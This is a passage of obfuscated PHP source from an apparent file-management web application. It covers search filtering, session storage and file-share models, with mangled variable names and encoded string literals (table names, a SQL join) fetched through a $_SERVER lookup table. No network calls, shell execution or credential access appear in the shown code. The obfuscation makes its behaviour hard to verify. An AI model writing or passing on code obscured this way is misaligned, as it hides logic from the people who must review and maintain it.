} $Š„€¦‹Î = Model($‘é˜ì˜–[2234])->listData(); $¦ÌéóÈ = array(); $ëŸí´‚ = $ŞàıàêŞ[$‘é˜ì˜–[2066]]; foreach ($Š„€¦‹Î as $¸ôë×€â) { $°ò„æë¡ = $¸ôë×€â[$‘é˜ì˜–[32]]; $‹×Š¾ˆ¦ = str_replace($‘é˜ì˜–[53], $‘é˜ì˜–[12], Pinyin::get($°ò„æë¡)); if (stripos($°ò„æë¡, $ëŸí´‚) !== !1 || stripos($‹×Š¾ˆ¦, $ëŸí´‚) !== !1) { $¦ÌéóÈ[] = $¸ôë×€â[$‘é˜ì˜–[475]]; } } if (!$¦ÌéóÈ) { return; } $â”ŞÒš = array($‘é˜ì˜–[500] => array($‘é˜ì˜–[7], $¦ÌéóÈ), $‘é˜ì˜–[1770] => USER_ID); $§¯›©ÊÎ = Model($‘é˜ì˜–[502])->field($‘é˜ì˜–[87])->where($â”ŞÒš)->select(); $§¯›©ÊÎ = array_to_keyvalue($§¯›©ÊÎ, $‘é˜ì˜–[12], $‘é˜ì˜–[87]); $¢Å÷’í¶ = array_unique($§¯›©ÊÎ); $this->_listSearchMerge($Ğş Ó¸í, $ŞàıàêŞ, $À¨Ôı†, $¢Å÷’í¶); } private function _listSearchDesc(&$˜ø§Øåá, $É­¥Âœ, $È¹ñÀœ) { $ÃÈ÷íÄÅ =& $_SERVER[¢ñàß¿€]; if (!$É­¥Âœ[$ÃÈ÷íÄÅ[2066]] || $˜ø§Øåá[$ÃÈ÷íÄÅ[442]][$ÃÈ÷íÄÅ[429]] > 1) { return; } $ğ„¾ñÊÂ = array($ÃÈ÷íÄÅ[97] => $ÃÈ÷íÄÅ[526], $ÃÈ÷íÄÅ[450] => array($ÃÈ÷íÄÅ[459], $ÃÈ÷íÄÅ[2068] . $É­¥Âœ[$ÃÈ÷íÄÅ[2066]] . $ÃÈ÷íÄÅ[2068])); $ùûğÊ§ = !1; if ($ùûğÊ§) { $ˆï»ä· = $this->listSearchChildren($É­¥Âœ[$ÃÈ÷íÄÅ[192]]); $ˆï»ä· = array_unique($ˆï»ä·); if (!$ˆï»ä·) { return; } $ğ„¾ñÊÂ[$ÃÈ÷íÄÅ[193]] = array($ÃÈ÷íÄÅ[7], $ˆï»ä·); } $Ò–”„Å = Model($ÃÈ÷íÄÅ[632])->field($ÃÈ÷íÄÅ[193])->where($ğ„¾ñÊÂ)->limit(5000)->select(); $Ğß”İ¥² = array_to_keyvalue($Ò–”„Å, $ÃÈ÷íÄÅ[12], $ÃÈ÷íÄÅ[193]); $this->_listSearchMerge($˜ø§Øåá, $É­¥Âœ, $È¹ñÀœ, $Ğß”İ¥²); } private function _listSearchGroupTag(&$áš€Äã, $Ú›ÅÕãÖ, $ı²Ä¬ÙÅ) { $Éè‡Àå° =& $_SERVER[¢ñàß¿€]; if (!$Ú›ÅÕãÖ[$Éè‡Àå°[2066]] || $áš€Äã[$Éè‡Àå°[442]][$Éè‡Àå°[429]] > 1 || !$Ú›ÅÕãÖ[$Éè‡Àå°[192]]) { return; } $ˆ¼™§Û = $this->sourceInfo($Ú›ÅÕãÖ[$Éè‡Àå°[192]]); if (!$ˆ¼™§Û || $ˆ¼™§Û[$Éè‡Àå°[190]] != SourceModel::TYPE_GROUP) { return; } $ÃÒ±çŞÙ = $ˆ¼™§Û[$Éè‡Àå°[569]]; $çØÚ¡ïµ = Model($Éè‡Àå°[2235])->get($ÃÒ±çŞÙ); $Ï‡Ÿ…ç = array(); $’€ş¤Åİ = $Ú›ÅÕãÖ[$Éè‡Àå°[2066]]; foreach ($çØÚ¡ïµ[$Éè‡Àå°[445]] as $ş÷Çªö‘) { $ˆµÈ¡ˆ = $ş÷Çªö‘[$Éè‡Àå°[32]]; $²´«÷“Î = str_replace($Éè‡Àå°[53], $Éè‡Àå°[12], Pinyin::get($ˆµÈ¡ˆ)); if (stripos($ˆµÈ¡ˆ, $’€ş¤Åİ) !== !1 || stripos($²´«÷“Î, $’€ş¤Åİ) !== !1) { $Ï‡Ÿ…ç[] = $ş÷Çªö‘[$Éè‡Àå°[475]]; } } if (!$Ï‡Ÿ…ç) { return; } $êõ´¹ó… = array($Éè‡Àå°[500] => array($Éè‡Àå°[7], $Ï‡Ÿ…ç), $Éè‡Àå°[1770] => 0, $Éè‡Àå°[33] => $Éè‡Àå°[2088] . $ÃÒ±çŞÙ); $êÚ×‹ı¹ = Model($Éè‡Àå°[502])->field($Éè‡Àå°[87])->where($êõ´¹ó…)->select(); $êÚ×‹ı¹ = array_to_keyvalue($êÚ×‹ı¹, $Éè‡Àå°[12], $Éè‡Àå°[87]); $Ö  Æ× = array_unique($êÚ×‹ı¹); $this->_listSearchMerge($áš€Äã, $Ú›ÅÕãÖ, $ı²Ä¬ÙÅ, $Ö  Æ×); } private function _listSearchMerge(&$ÔÃ¢è¬, $ÁÙñ¾é, $Èšù½Ê¿, $ÇŸˆ’) { $¦¼ĞÎ’Ç =& $_SERVER[¢ñàß¿€]; if (!$ÇŸˆ’) { return; } $––ø®“¤ = array_to_keyvalue($ÔÃ¢è¬[$¦¼ĞÎ’Ç[445]], $¦¼ĞÎ’Ç[12], $¦¼ĞÎ’Ç[193]); $úêš¥Ü = array_diff($ÇŸˆ’, $––ø®“¤); if (!$úêš¥Ü) { return; } $æéŸ¹‡Â = array($¦¼ĞÎ’Ç[193] => array($¦¼ĞÎ’Ç[7], $úêš¥Ü)); $ãõóí¶ï = $this->field($Èšù½Ê¿)->where($æéŸ¹‡Â)->select(); if (!$ãõóí¶ï) { return; } $‡â¦¤æ = array(); foreach ($ãõóí¶ï as $Í°¸”êÂ) { if ($this->_listSearchFilter($Í°¸”êÂ, $ÁÙñ¾é)) { $‡â¦¤æ[] = $Í°¸”êÂ; } } $ÔÃ¢è¬[$¦¼ĞÎ’Ç[445]] = array_merge($‡â¦¤æ, $ÔÃ¢è¬[$¦¼ĞÎ’Ç[445]]); $ÔÃ¢è¬[$¦¼ĞÎ’Ç[442]][$¦¼ĞÎ’Ç[443]] += count($‡â¦¤æ); } private function _listSearchFilter($çºæù, $Ç§™’‡é) { $—©ÆÈÕ =& $_SERVER[¢ñàß¿€]; $Åñì¼“Î = $çºæù[$—©ÆÈÕ[485]] == $—©ÆÈÕ[91]; if (!strstr($çºæù[$—©ÆÈÕ[584]], $—©ÆÈÕ[50] . $Ç§™’‡é[$—©ÆÈÕ[192]] . $—©ÆÈÕ[50])) { return !1; } if (isset($Ç§™’‡é[$—©ÆÈÕ[486]]) && $Ç§™’‡é[$—©ÆÈÕ[486]] != $—©ÆÈÕ[847]) { if ($Ç§™’‡é[$—©ÆÈÕ[486]] == $—©ÆÈÕ[78] && !$Åñì¼“Î) { return !1; } if ($Ç§™’‡é[$—©ÆÈÕ[486]] != $—©ÆÈÕ[78] && $Åñì¼“Î) { return !1; } if (!strstr($çºæù[$—©ÆÈÕ[169]], $—©ÆÈÕ[50] . $Ç§™’‡é[$—©ÆÈÕ[486]] . $—©ÆÈÕ[50])) { return !1; } } if (isset($Ç§™’‡é[$—©ÆÈÕ[2236]]) && $Ç§™’‡é[$—©ÆÈÕ[2236]] < $çºæù[$—©ÆÈÕ[79]]) { return !1; } if (isset($Ç§™’‡é[$—©ÆÈÕ[2237]]) && $Ç§™’‡é[$—©ÆÈÕ[2237]] > $çºæù[$—©ÆÈÕ[79]]) { return !1; } if (isset($Ç§™’‡é[$—©ÆÈÕ[662]]) && $Ç§™’‡é[$—©ÆÈÕ[662]] != $çºæù[$—©ÆÈÕ[529]]) { return !1; } return !0; } public function listSearchChildren($á¼Ö»õş, $¼úÁ²ïÁ = 5000) { $óİèÊåˆ =& $_SERVER[¢ñàß¿€]; $åÜ³¥¬¾ = array(); $à•ßàĞ = $this->sourceInfo($á¼Ö»õş); $¹ƒ‘‡ÅË = array($óİèÊåˆ[584] => array($óİèÊåˆ[459], $à•ßàĞ[$óİèÊåˆ[584]] . $à•ßàĞ[$óİèÊåˆ[193]] . $óİèÊåˆ[613])); $ªµú‡© = $this->field($óİèÊåˆ[79])->where($¹ƒ‘‡ÅË)->limit($¼úÁ²ïÁ + 1)->select(); $½Â×’‡Š = is_array($ªµú‡©) ? count($ªµú‡©) : 0; if ($½Â×’‡Š > $¼úÁ²ïÁ) { return $this->_listSearchChildrenNear($á¼Ö»õş, $¼úÁ²ïÁ); } $ä­¹¼·ï = $this->field($óİèÊåˆ[193])->where($¹ƒ‘‡ÅË)->select(); $åÜ³¥¬¾ = array_to_keyvalue($ä­¹¼·ï, $óİèÊåˆ[12], $óİèÊåˆ[193]); return $åÜ³¥¬¾; } private function _listSearchChildrenNear($šîâ³¡ğ, $à¥‚šÆÖ) { $µË§ã š =& $_SERVER[¢ñàß¿€]; $²Æª‚ä = array(); $…†öÃèæ = array($µË§ã š[192] => $šîâ³¡ğ); $ò¦ó€Æ = $this->field($µË§ã š[2238])->where($…†öÃèæ)->select(); $Îúœ„Ì = array_to_keyvalue(array_filter_by_field($ò¦ó€Æ, $µË§ã š[485], $µË§ã š[91]), $µË§ã š[12], $µË§ã š[193]); $²Æª‚ä = array_merge($²Æª‚ä, array_to_keyvalue($ò¦ó€Æ, $µË§ã š[12], $µË§ã š[193])); if (!$Îúœ„Ì) { return $²Æª‚ä; } $…†öÃèæ = array($µË§ã š[192] => array($µË§ã š[7], $Îúœ„Ì)); $ò¦ó€Æ = $this->field($µË§ã š[2238])->where($…†öÃèæ)->limit($à¥‚šÆÖ)->select(); $²Æª‚ä = array_merge($²Æª‚ä, array_to_keyvalue($ò¦ó€Æ, $µË§ã š[12], $µË§ã š[193])); $²Æª‚ä = array_slice($²Æª‚ä, 0, intval($à¥‚šÆÖ)); return $²Æª‚ä; } private function _listSearchBindPinyin($®Õ°¤ä, &$ıÄ¬¡®¹, &$‚Ü˜—µı) { $Å—×Šö =& $_SERVER[¢ñàß¿€]; if (!isset($®Õ°¤ä[$Å—×Šö[2066]]) || !$®Õ°¤ä[$Å—×Šö[2066]]) { return; } if (!Input::check($®Õ°¤ä[$Å—×Šö[2066]], $Å—×Šö[394]) || strlen($®Õ°¤ä[$Å—×Šö[2066]]) < 2) { return; } $±·™ğÃ = "\114\105\106\124\40\x4a\x4f\x49\x4e\x20{$this->tablePrefix}\151\157\x5f\x73\x6f\165\x72\x63\x65\x5f\x6d\x65\164\141\x20\x6d\145\164\141\x20\157\156\40\163\157\165\162\x63\x65\56\163\x6f\165\162\143\145\x49\x44\x20\75\x20\x6d\145\x74\x61\x2e\163\x6f\x75\x72\x63\145\111\104"; $‡¥ï‡±’ = array(); $‚Ü˜—µı = str_replace(array($Å—×Šö[262], $Å—×Šö[53], $Å—×Šö[2239]), $Å—×Šö[12], $‚Ü˜—µı); $‚Ü˜—µı = $Å—×Šö[511] . str_replace($Å—×Šö[50], $Å—×Šö[512], $‚Ü˜—µı); $‚…Ó±ş = $ıÄ¬¡®¹[$Å—×Šö[32]]; unset($ıÄ¬¡®¹[$Å—×Šö[32]]); foreach ($ıÄ¬¡®¹ as $·¦‚¢Ï£ => $ùÖßïÆü) { $‡¥ï‡±’[$Å—×Šö[511] . $·¦‚¢Ï£] = $ùÖßïÆü; } foreach ($‚…Ó±ş as $‰¾â’‰¿) { $‡¥ï‡±’[] = array($Å—×Šö[516] => $‰¾â’‰¿, $Å—×Šö[1075] => $Å—×Šö[2070], array($Å—×Šö[2240] => $‰¾â’‰¿, $Å—×Šö[2241] => array($Å—×Šö[7], array($Å—×Šö[538], $Å—×Šö[537])))); } $this->join($±·™ğÃ); $ıÄ¬¡®¹ = $‡¥ï‡±’; } private function _parseSearchWhere($ÔúÁ‰ıŸ) { $®ª†Ñ =& $_SERVER[¢ñàß¿€]; $˜û‹›Ïì = array(); if (isset($ÔúÁ‰ıŸ[$®ª†Ñ[831]]) && $ÔúÁ‰ıŸ[$®ª†Ñ[831]]) { $˜û‹›Ïì[$®ª†Ñ[88]] = array($®ª†Ñ[2242], $ÔúÁ‰ıŸ[$®ª†Ñ[831]]); } if (isset($ÔúÁ‰ıŸ[$®ª†Ñ[832]]) && $ÔúÁ‰ıŸ[$®ª†Ñ[832]]) { $¿êì»ƒ = array($®ª†Ñ[2243], $ÔúÁ‰ıŸ[$®ª†Ñ[832]]); if ($˜û‹›Ïì[$®ª†Ñ[88]]) { $˜û‹›Ïì[$®ª†Ñ[88]] = array($˜û‹›Ïì[$®ª†Ñ[88]], $¿êì»ƒ, $®ª†Ñ[2244]); } else { $˜û‹›Ïì[$®ª†Ñ[88]] = $¿êì»ƒ; } } if (isset($ÔúÁ‰ıŸ[$®ª†Ñ[2236]]) && $ÔúÁ‰ıŸ[$®ª†Ñ[2236]] > 0) { $˜û‹›Ïì[$®ª†Ñ[79]] = array($®ª†Ñ[2242], $ÔúÁ‰ıŸ[$®ª†Ñ[2236]]); } if (isset($ÔúÁ‰ıŸ[$®ª†Ñ[2237]]) && $ÔúÁ‰ıŸ[$®ª†Ñ[2237]]) { $¿êì»ƒ = array($®ª†Ñ[2243], $ÔúÁ‰ıŸ[$®ª†Ñ[2237]]); if ($˜û‹›Ïì[$®ª†Ñ[79]]) { $˜û‹›Ïì[$®ª†Ñ[79]] = array($˜û‹›Ïì[$®ª†Ñ[79]], $¿êì»ƒ, $®ª†Ñ[2244]); } else { $˜û‹›Ïì[$®ª†Ñ[79]] = $¿êì»ƒ; } } if (isset($ÔúÁ‰ıŸ[$®ª†Ñ[662]]) && $ÔúÁ‰ıŸ[$®ª†Ñ[662]]) { $˜û‹›Ïì[] = array($®ª†Ñ[529] => $ÔúÁ‰ıŸ[$®ª†Ñ[662]], $®ª†Ñ[527] => $ÔúÁ‰ıŸ[$®ª†Ñ[662]], $®ª†Ñ[1075] => $®ª†Ñ[2070]); } if (isset($ÔúÁ‰ıŸ[$®ª†Ñ[486]]) && $ÔúÁ‰ıŸ[$®ª†Ñ[486]]) { $‡ÈğùØ– = $ÔúÁ‰ıŸ[$®ª†Ñ[486]]; if ($‡ÈğùØ– == $®ª†Ñ[78]) { $˜û‹›Ïì[$®ª†Ñ[485]] = 1; } else { if ($‡ÈğùØ– == $®ª†Ñ[2245]) { $˜û‹›Ïì[$®ª†Ñ[485]] = 0; } else { if ($‡ÈğùØ–) { $‡ÈğùØ– = is_array($‡ÈğùØ–) ? $‡ÈğùØ– : explode($®ª†Ñ[50], $‡ÈğùØ–); $˜û‹›Ïì[$®ª†Ñ[486]] = array($®ª†Ñ[492], $‡ÈğùØ–); $˜û‹›Ïì[$®ª†Ñ[485]] = 0; } } } } $this->_parseSearchParent($ÔúÁ‰ıŸ, $˜û‹›Ïì); if (isset($ÔúÁ‰ıŸ[$®ª†Ñ[2066]]) && trim($ÔúÁ‰ıŸ[$®ª†Ñ[2066]])) { $“•ìØ¦È = trim($ÔúÁ‰ıŸ[$®ª†Ñ[2066]]); $ÄÉğØ®ú = explode($®ª†Ñ[53], $“•ìØ¦È); if (strlen($“•ìØ¦È) > 2 && (substr($“•ìØ¦È, 0, 1) == $®ª†Ñ[121] && substr($“•ìØ¦È, -1) == $®ª†Ñ[121]) || substr($“•ìØ¦È, 0, 1) == $®ª†Ñ[58] && substr($“•ìØ¦È, -1) == $®ª†Ñ[58]) { $“•ìØ¦È = substr($“•ìØ¦È, 1, -1); $ÄÉğØ®ú = array($“•ìØ¦È); } $˜û‹›Ïì[$®ª†Ñ[32]] = array(array($®ª†Ñ[612], $®ª†Ñ[2068] . $“•ìØ¦È . $®ª†Ñ[2068])); if (count($ÄÉğØ®ú) > 1) { $˜û‹›Ïì[$®ª†Ñ[32]] = array(); foreach ($ÄÉğØ®ú as $»†±‚´¤) { if (!trim($»†±‚´¤)) { continue; } $˜û‹›Ïì[$®ª†Ñ[32]][] = array($®ª†Ñ[612], $®ª†Ñ[2068] . trim($»†±‚´¤) . $®ª†Ñ[2068]); } } } return $˜û‹›Ïì; } private function _parseSearchParent($éáçûœ´, &$ô¨ıó¦¡) { $ş”şŸüÔ =& $_SERVER[¢ñàß¿€]; if (!isset($éáçûœ´[$ş”şŸüÔ[192]]) || !$éáçûœ´[$ş”şŸüÔ[192]]) { return; } $¨÷‘û²í = $this->pathInfo($éáçûœ´[$ş”şŸüÔ[192]]); $Ùš÷ß›× = $¨÷‘û²í[$ş”şŸüÔ[192]] . $ş”şŸüÔ[12] === $ş”şŸüÔ[228]; $Ò„—ò¨ = $¨÷‘û²í[$ş”şŸüÔ[190]] == $ş”şŸüÔ[578]; if ($¨÷‘û²í[$ş”şŸüÔ[595]] == $ş”şŸüÔ[596]) { $»ïëŠš‚ = $this->sourceInfo($éáçûœ´[$ş”şŸüÔ[192]]); $¨÷‘û²í[$ş”şŸüÔ[584]] = $»ïëŠš‚[$ş”şŸüÔ[584]]; } $ô¨ıó¦¡[$ş”şŸüÔ[652]] = array($ş”şŸüÔ[612], $¨÷‘û²í[$ş”şŸüÔ[584]] . $éáçûœ´[$ş”şŸüÔ[192]] . $ş”şŸüÔ[613]); $ùäÏÖï = isset($éáçûœ´[$ş”şŸüÔ[1927]]) && in_array($ş”şŸüÔ[578], $éáçûœ´[$ş”şŸüÔ[1927]]); if (!$ùäÏÖï || !$Ò„—ò¨ || !$Ùš÷ß›× || !$¨÷‘û²í[$ş”şŸüÔ[487]]) { return; } if (!AuthModel::authCheckRoot($¨÷‘û²í[$ş”şŸüÔ[487]][$ş”şŸüÔ[488]])) { return; } $«çªøª = $¨÷‘û²í[$ş”şŸüÔ[569]] . $ş”şŸüÔ[12]; if ($«çªøª == $ş”şŸüÔ[91]) { unset($ô¨ıó¦¡[$ş”şŸüÔ[652]]); $ô¨ıó¦¡[$ş”şŸüÔ[190]] = self::TYPE_GROUP; return; } $«Éà±§ = Model($ş”şŸüÔ[585])->groupChildrenAll($«çªøª); $àËôşÃ = count($«Éà±§); if ($àËôşÃ <= 1) { return; } $¾ı—€± = array($ş”şŸüÔ[192] => 0, $ş”şŸüÔ[190] => self::TYPE_GROUP, $ş”şŸüÔ[569] => array($ş”şŸüÔ[7], $«Éà±§)); $¸ÈÒó­ = $this->field($ş”şŸüÔ[2246])->where($¾ı—€±)->limit($àËôşÃ)->select(); $ô¨ıó¦¡[$ş”şŸüÔ[652]] = array(); foreach ($¸ÈÒó­ as $Èäğ‹åÒ) { $ô¨ıó¦¡[$ş”şŸüÔ[652]][] = array($ş”şŸüÔ[612], $ş”şŸüÔ[594] . $Èäğ‹åÒ[$ş”şŸüÔ[193]] . $ş”şŸüÔ[613]); } $ô¨ıó¦¡[$ş”şŸüÔ[652]][] = $ş”şŸüÔ[2070]; } } goto ašƒ¡ã¯ó; d¶•ùÎƒçÒ: class SessionModel extends ModelBase { protected $tableName = "\163\x79\x73\x74\x65\x6d\137\163\145\163\163\151\x6f\x6e"; public function get($¦ıËêŞ) { $ÜÊ¢Ü =& $_SERVER[¢ñàß¿€]; $â®¥Ğ„È = $this->where(array($ÜÊ¢Ü[2107] => $¦ıËêŞ))->find(); if (!is_array($â®¥Ğ„È)) { return !1; } return $â®¥Ğ„È[$ÜÊ¢Ü[171]]; } public function set($‡ÊÊá©, $Ü£ÂÑóÓ, $§åŒâãá = 3600) { $èõ×ğ„ğ =& $_SERVER[¢ñàß¿€]; $Ô„ÉÂ = array($èõ×ğ„ğ[2107] => $‡ÊÊá©, $èõ×ğ„ğ[2007] => $Ü£ÂÑóÓ, $èõ×ğ„ğ[2108] => $§åŒâãá + time()); if (Session::get($èõ×ğ„ğ[2109])) { $Ô„ÉÂ[$èõ×ğ„ğ[1770]] = Session::get($èõ×ğ„ğ[2109]); } else { $Ô„ÉÂ[$èõ×ğ„ğ[1770]] = 0; } if ($this->get($‡ÊÊá©)) { return $this->where(array($èõ×ğ„ğ[2107] => $‡ÊÊá©))->save($Ô„ÉÂ); } else { return $this->add($Ô„ÉÂ, array(), !0); } } public function remove($½†Ç‹œ) { return $this->where(array($_SERVER[¢ñàß¿€][2107] => $½†Ç‹œ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[¢ñàß¿€][2110] . time())->delete(); } } class ShareModel extends ModelBase { protected $tableName = "\x73\150\x61\x72\x65"; protected $dataAuto = array(array("\x6d\x6f\x64\x69\146\x79\x54\151\155\x65", "\164\151\155\145", "\151\x6e\x73\x65\x72\164\x2c\x75\x70\x64\x61\x74\x65", "\146\165\156\143\x74\151\x6f\156"), array("\x63\x72\145\x61\164\x65\x54\151\155\x65", "\x74\151\155\x65", "\x69\156\163\x65\162\x74", "\146\x75\156\x63\164\x69\157\x6e"), array("\x6f\160\164\x69\157\156\x73", '', "\x69\156\x73\145\162\164\x2c\165\160\144\141\164\145\54\163\145\x6c\145\x63\x74", "\x6a\163\157\x6e")); private $fieldList = "\x2a"; protected function cacheFunctionAlias($‡–Õüİµ) { $†¡³¨— =& $_SERVER[¢ñàß¿€]; $©û›áÙ  = isset($‡–Õüİµ[0]) ? $‡–Õüİµ[0] : !1; return array($†¡³¨—[2111] => array(USER_ID, $†¡³¨—[2112]), $†¡³¨—[2052] => array($©û›áÙ , $†¡³¨—[2113])); } protected function listSimple() { $”ƒ¨¡ÚÉ = array($_SERVER[¢ñàß¿€][1770] => USER_ID); $üÄÍ ã¸ = $this->field($this->fieldList)->where($”ƒ¨¡ÚÉ)->select(); return $üÄÍ ã¸ ? $üÄÍ ã¸ : array(); } protected function getInfo($´Üâı, $ª†ºÀñı = false) { $Éãóê•Ğ =& $_SERVER[¢ñàß¿€]; if ($ª†ºÀñı) { return $this->_getShareInfo(array($Éãóê•Ğ[665] => $´Üâı)); } $¦¸¸„¶ = $this->cacheFunctionGet($Éãóê•Ğ[2054], $´Üâı); return $¦¸¸„¶; } public function getInfoByHash($²Û¹Ìßı) { return $this->_getShareInfo(array($_SERVER[¢ñàß¿€][2114] => $²Û¹Ìßı)); } public function getInfoByPath($÷¦å´™Ù) { $Ûûß‘Ò¬ =& $_SERVER[¢ñàß¿€]; $àºÖòô = array($Ûûß‘Ò¬[1770] => USER_ID, $Ûûß‘Ò¬[193] => $÷¦å´™Ù); return $this->_getShareInfo($àºÖòô); } public function getInfoBySourcePath($§¿Áöş×) { $ÈÓÈ¶øÕ =& $_SERVER[¢ñàß¿€]; $›ñÛøÙ› = array($ÈÓÈ¶øÕ[1770] => USER_ID, $ÈÓÈ¶øÕ[1254] => $§¿Áöş×); return $this->_getShareInfo($›ñÛøÙ›); } private function _getShareInfo($µËÅ“€¬) { $‚Ğ§Ñº‹ =& $_SERVER[¢ñàß¿€]; $µ€È»¥ç = $this->where($µËÅ“€¬)->find(); if (!$µ€È»¥ç) { return !1; } $µËÅ“€¬ = array($‚Ğ§Ñº‹[665] => $µ€È»¥ç[$‚Ğ§Ñº‹[665]]); $àÁ¡ÉÜ = $‚Ğ§Ñº‹[2115]; $ÕúàÇşÆ = Model($‚Ğ§Ñº‹[666])->order($‚Ğ§Ñº‹[475])->field($àÁ¡ÉÜ)->where($µËÅ“€¬)->select(); if ($µ€È»¥ç[$‚Ğ§Ñº‹[193]] == $‚Ğ§Ñº‹[228]) { $µ€È»¥ç[$‚Ğ§Ñº‹[90]] = IO::info($µ€È»¥ç[$‚Ğ§Ñº‹[1254]]); } else { $µ€È»¥ç[$‚Ğ§Ñº‹[90]] = Model($‚Ğ§Ñº‹[1414])->pathInfo($µ€È»¥ç[$‚Ğ§Ñº‹[193]]); } $µ€È»¥ç[$‚Ğ§Ñº‹[2116]] = $ÕúàÇşÆ; return $µ€È»¥ç; } protected function getInfoAuth($ÇÙ‹¹ÉÕ) { $¥ÈîŠ¡ =& $_SERVER[¢ñàß¿€]; $¥†á¯¯¡ = $this->getInfo($ÇÙ‹¹ÉÕ); if ($¥†á¯¯¡[$¥ÈîŠ¡[1770]] == USER_ID) { $¥†á¯¯¡[$¥ÈîŠ¡[487]] = $¥†á¯¯¡[$¥ÈîŠ¡[90]][$¥ÈîŠ¡[487]]; } else { $¥†á¯¯¡[$¥ÈîŠ¡[487]] = Model($¥ÈîŠ¡[567])->authMake($¥†á¯¯¡[$¥ÈîŠ¡[2116]]); } return $¥†á¯¯¡; } protected function listData($ÂºÉ¿İê = null, $«œ˜ ñ = 300) { $¦Ä×¼ã =& $_SERVER[¢ñàß¿€]; $ Š’ƒÍ® = array(array($¦Ä×¼ã[562] => array($¦Ä×¼ã[1087], 0), $¦Ä×¼ã[663] => array($¦Ä×¼ã[1087], 0), $¦Ä×¼ã[2117] => $¦Ä×¼ã[2070])); if ($ÂºÉ¿İê == $¦Ä×¼ã[2118]) { $ Š’ƒÍ® = array($¦Ä×¼ã[562] => 1); } else { if ($ÂºÉ¿İê == $¦Ä×¼ã[1239]) { $ Š’ƒÍ® = array($¦Ä×¼ã[663] => 1); } } $ Š’ƒÍ®[$¦Ä×¼ã[1770]] = USER_ID; $»ôä®Ùô = $this->where($ Š’ƒÍ®)->selectPage($«œ˜ ñ); return $»ôä®Ùô; } protected function listToMe($ú°Ó„ÖË = 300) { $Ù‰›å±¬ =& $_SERVER[¢ñàß¿€]; $ììÛÛñ“ = Model($Ù‰›å±¬[2119])->userGroupParents(USER_ID); $›Ô’¢èñ = array($Ù‰›å±¬[648] => SourceModel::TYPE_USER, $Ù‰›å±¬[569] => USER_ID); if ($ììÛÛñ“) { $›Ô’¢èñ = array(array($Ù‰›å±¬[648] => SourceModel::TYPE_USER, $Ù‰›å±¬[569] => USER_ID), array($Ù‰›å±¬[648] => SourceModel::TYPE_GROUP, $Ù‰›å±¬[569] => array($Ù‰›å±¬[7], $ììÛÛñ“)), $Ù‰›å±¬[2117] => $Ù‰›å±¬[2070]); } $›»òÃÉÕ = Model($Ù‰›å±¬[666])->where($›Ô’¢èñ)->selectPage($ú°Ó„ÖË); $¦ºšê¸ = array_to_keyvalue_group($›»òÃÉÕ[$Ù‰›å±¬[445]], $Ù‰›å±¬[665]); if (!$¦ºšê¸) { return $›»òÃÉÕ; } $ÚĞ„Õ À = $Ù‰›å±¬[2120]; $›Ô’¢èñ = array($Ù‰›å±¬[665] => array($Ù‰›å±¬[492], array_keys($¦ºšê¸)), $Ù‰›å±¬[1770] => array($Ù‰›å±¬[1089], $Ù‰›å±¬[228])); $ÇğüÒ˜Í = $this->field($ÚĞ„Õ À)->where($›Ô’¢èñ)->select(); foreach ($ÇğüÒ˜Í as $Ñ–ÅïÈÁ => &$Ó´šß×Ñ) { $Ó´šß×Ñ[$Ù‰›å±¬[2116]] = $¦ºšê¸[$Ó´šß×Ñ[$Ù‰›å±¬[665]]]; } unset($Ó´šß×Ñ); $Ÿß„×şÁ = array($Ù‰›å±¬[2121] => $ÇğüÒ˜Í, $Ù‰›å±¬[2122] => $›»òÃÉÕ[$Ù‰›å±¬[442]]); return $Ÿß„×şÁ; } protected function shareAdd($î‹ŸÚ, $àı•åŠ) { $€óÍÔî =& $_SERVER[¢ñàß¿€]; $³ÜŒıŸ‚ = $this->_addShareData($î‹ŸÚ, $àı•åŠ); if (!empty($àı•åŠ[$€óÍÔî[2123]])) { $this->_shareAuthSet($³ÜŒıŸ‚, $àı•åŠ[$€óÍÔî[2123]]); } $this->shareEventAdd($î‹ŸÚ, $àı•åŠ, $€óÍÔî[2124]); return $³ÜŒıŸ‚; } protected function shareAddSystem($Ü­’šëÛ, $ï¯øúÛ) { $‚“ß¼… =& $_SERVER[¢ñàß¿€]; $üÑ†³µú = $this->_addShareData($Ü­’šëÛ, $ï¯øúÛ, $‚“ß¼…[191]); $this->_shareAuthSet($üÑ†³µú, $ï¯øúÛ[$‚“ß¼…[2123]]); return $üÑ†³µú; } private function shareEventAdd($¿ËŒ‡Ä„, $í¿Ü…¨á, $—æ¦›ºä = "\x61\x64\144") { $šÌƒøÎ =& $_SERVER[¢ñàß¿€]; if (!$¿ËŒ‡Ä„ || $¿ËŒ‡Ä„ == $šÌƒøÎ[228]) { return; } if ($—æ¦›ºä == $šÌƒøÎ[2124]) { if ($í¿Ü…¨á[$šÌƒøÎ[562]] == $šÌƒøÎ[91]) { Model($šÌƒøÎ[633])->eventShare($¿ËŒ‡Ä„, $šÌƒøÎ[2125]); } if ($í¿Ü…¨á[$šÌƒøÎ[663]] == $šÌƒøÎ[91]) { Model($šÌƒøÎ[633])->eventShare($¿ËŒ‡Ä„, $šÌƒøÎ[2126]); } return; } $ªæ¶Ê’ = $this->getInfoByPath($¿ËŒ‡Ä„); $ıóĞô°¾ = $šÌƒøÎ[2127]; if ($ªæ¶Ê’[$šÌƒøÎ[562]] == $šÌƒøÎ[228] && $í¿Ü…¨á[$šÌƒøÎ[562]] == $šÌƒøÎ[91]) { $ıóĞô°¾ = $šÌƒøÎ[2125]; } if ($ªæ¶Ê’[$šÌƒøÎ[562]] == $šÌƒøÎ[91] && $í¿Ü…¨á[$šÌƒøÎ[562]] == $šÌƒøÎ[228]) { $ıóĞô°¾ = $šÌƒøÎ[2128]; } if ($ªæ¶Ê’[$šÌƒøÎ[663]] == $šÌƒøÎ[228] && $í¿Ü…¨á[$šÌƒøÎ[663]] == $šÌƒøÎ[91]) { $ıóĞô°¾ = $šÌƒøÎ[2126]; } if ($ªæ¶Ê’[$šÌƒøÎ[663]] == $šÌƒøÎ[91] && $í¿Ü…¨á[$šÌƒøÎ[663]] == $šÌƒøÎ[228]) { $ıóĞô°¾ = $šÌƒøÎ[2129]; } Model($šÌƒøÎ[633])->eventShare($¿ËŒ‡Ä„, $ıóĞô°¾); return; } private function _addShareData($¡„°ª·“, $õ©âËû = array(), $¸¡ïæ¥· = false) { $¢²Ûö‚Ï =& $_SERVER[¢ñàß¿€]; $†‰Á¹Õ½ = $¸¡ïæ¥· == $¢²Ûö‚Ï[191] ? 0 : USER_ID; $‹íï­Ù = array($¢²Ûö‚Ï[491] => $¡„°ª·“, $¢²Ûö‚Ï[1761] => $†‰Á¹Õ½); if 